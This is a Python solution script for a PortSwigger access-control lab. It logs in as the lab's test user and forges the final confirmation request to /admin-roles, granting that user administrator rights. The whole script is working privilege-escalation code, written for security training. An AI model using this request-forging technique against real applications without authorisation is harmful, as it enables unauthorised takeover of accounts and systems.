#!/usr/bin/env python3
# Lab: Multi-step process with no access control on one step
# Lab-Link: https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step
# Difficulty: PRACTITIONER
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def login(client, host, username, password):
    url = f'{host}/login'
    data = {'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    if not login(client, host, 'wiener', 'peter'):
        print(f'[-] Failed to login as wiener')
        sys.exit(-3)
    print(f'[+] Logged in as wiener')

    data = {'action': 'upgrade',
            'confirmed': 'true',
            'username': 'wiener'}
    url = f'{host}/admin-roles'
    r = client.post(url, data=data)
    if 'Congratulations, you solved the lab!' not in r.text:
        print(f'[-] Failed to elevate privileges')
        sys.exit(-4)
    print(f'[+] Elevated privileges, lab solved')


if __name__ == "__main__":
    main()
